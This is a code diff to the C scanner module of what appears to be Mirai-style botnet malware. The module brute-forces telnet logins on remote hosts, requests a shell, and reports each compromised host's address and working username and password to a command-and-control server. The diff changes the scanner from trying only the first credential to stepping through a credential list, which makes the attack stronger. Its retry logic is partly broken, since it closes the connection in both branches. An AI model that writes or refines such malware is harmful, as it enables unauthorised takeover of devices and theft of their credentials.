@@ -38,6 +38,7 @@ struct scanner_connection {
     uint16_t dst_port;
     time_t last_recv;
     time_t connect_time;
+    int cred_index;  /* Current credential index being tried */
 };
 
 static struct scanner_connection conns[SCANNER_MAX_CONNS];
@@ -322,6 +323,7 @@ static BOOL is_rfc1918(ipv4_t);
 void scanner_init(void) {
     int i;
     time_t last_connect_time = 0;
+    time_t now = 0;
 
     if (fork() == 0) {
         /* Initialize connections */
@@ -352,9 +354,9 @@ void scanner_init(void) {
             tv.tv_usec = 0;
 
             int nfds = select(maxfd + 1, &fdset, NULL, NULL, &tv);
-            
+
             /* Check for timeouts */
-            time_t now = time(NULL);
+            now = time(NULL);
             for (i = 0; i < SCANNER_MAX_CONNS; i++) {
                 if (conns[i].state != SC_CLOSED && now - conns[i].last_recv > 30) {
                     scanner_close(&conns[i]);
@@ -389,21 +391,22 @@ void scanner_init(void) {
 
 static void scanner_connect(struct scanner_connection *conn) {
     struct sockaddr_in addr;
-    
+
     conn->fd = socket(AF_INET, SOCK_STREAM, 0);
     if (conn->fd == -1) return;
-    
+
     fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
-    
+
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = conn->dst_addr;
     addr.sin_port = htons(conn->dst_port);
-    
+
     connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));
-    
+
     conn->state = SC_CONNECTING;
     conn->connect_time = time(NULL);
     conn->last_recv = time(NULL);
+    conn->cred_index = 0;  /* Start with first credential */
 }
 
 static void scanner_close(struct scanner_connection *conn) {
@@ -452,36 +455,49 @@ static void scanner_handle_recv(struct scanner_connection *conn) {
         /* Check if negotiation complete */
         if (iac_pos == 0 && n > 0) {
             conn->state = SC_WAITING_USERNAME;
-            
-            /* Try first credential */
-            char *username = credentials[0].username;
-            char *password = credentials[0].password;
-            
+
+            /* Try current credential */
+            if (credentials[conn->cred_index].username == NULL) {
+                /* No more credentials, close connection */
+                scanner_close(conn);
+                return;
+            }
+
+            char *username = credentials[conn->cred_index].username;
+            char *password = credentials[conn->cred_index].password;
+
             send(conn->fd, username, util_strlen(username), 0);
             send(conn->fd, "\r\n", 2, 0);
-            
+
             conn->state = SC_WAITING_PASSWORD;
         }
         return;
     }
-    
+
     /* State machine for login */
     switch (conn->state) {
         case SC_WAITING_PASSWORD:
             if (util_stristr(buf, n, "login") || util_stristr(buf, n, "username")) {
                 /* Send password */
-                char *password = credentials[0].password;
+                char *password = credentials[conn->cred_index].password;
                 send(conn->fd, password, util_strlen(password), 0);
                 send(conn->fd, "\r\n", 2, 0);
                 conn->state = SC_WAITING_PASSWD_RESP;
             }
             break;
-            
+
         case SC_WAITING_PASSWD_RESP:
-            if (util_stristr(buf, n, "error") || util_stristr(buf, n, "failed") || 
+            if (util_stristr(buf, n, "error") || util_stristr(buf, n, "failed") ||
                 util_stristr(buf, n, "invalid") || util_stristr(buf, n, "incorrect")) {
                 /* Login failed, try next credential */
-                scanner_close(conn);
+                conn->cred_index++;
+                if (credentials[conn->cred_index].username != NULL) {
+                    /* Try next credential */
+                    scanner_close(conn);
+                } else {
+                    /* No more credentials */
+                    scanner_close(conn);
+                }
             } else {
                 /* Try to get shell */
                 send(conn->fd, "shell\r\n", 7, 0);
@@ -490,35 +506,35 @@ static void scanner_handle_recv(struct scanner_connection *conn) {
             break;
             
         case SC_WAITING_SHELL_RESP:
-            if (util_stristr(buf, n, "shell") || util_stristr(buf, n, "#") || 
+            if (util_stristr(buf, n, "shell") || util_stristr(buf, n, "#") ||
                 util_stristr(buf, n, "$") || util_stristr(buf, n, ">")) {
                 /* Got shell - report to C&C */
                 uint8_t report[16];
                 uint32_t addr = conn->dst_addr;
                 uint16_t port = htons(conn->dst_port);
-                
+
                 report[0] = (addr >> 24) & 0xFF;
                 report[1] = (addr >> 16) & 0xFF;
                 report[2] = (addr >> 8) & 0xFF;
                 report[3] = addr & 0xFF;
                 report[4] = (port >> 8) & 0xFF;
                 report[5] = port & 0xFF;
-                report[6] = util_strlen(credentials[0].username);
-                memcpy(report + 7, credentials[0].username, report[6]);
-                report[7 + report[6]] = util_strlen(credentials[0].password);
-                memcpy(report + 8 + report[6], credentials[0].password, report[7 + report[6]]);
-                
+                report[6] = util_strlen(credentials[conn->cred_index].username);
+                memcpy(report + 7, credentials[conn->cred_index].username, report[6]);
+                report[7 + report[6]] = util_strlen(credentials[conn->cred_index].password);
+                memcpy(report + 8 + report[6], credentials[conn->cred_index].password, report[7 + report[6]]);
+
                 int fd = socket(AF_INET, SOCK_STREAM, 0);
                 struct sockaddr_in cnc;
                 cnc.sin_family = AF_INET;
                 cnc.sin_addr.s_addr = inet_addr(CNC_ADDR);
                 cnc.sin_port = htons(SCAN_CB_PORT);
-                
+
                 if (connect(fd, (struct sockaddr *)&cnc, sizeof(cnc)) == 0) {
                     send(fd, report, 8 + report[6] + report[7 + report[6]], 0);
                 }
                 close(fd);
-                
+
                 scanner_close(conn);
             } else {
                 scanner_close(conn);
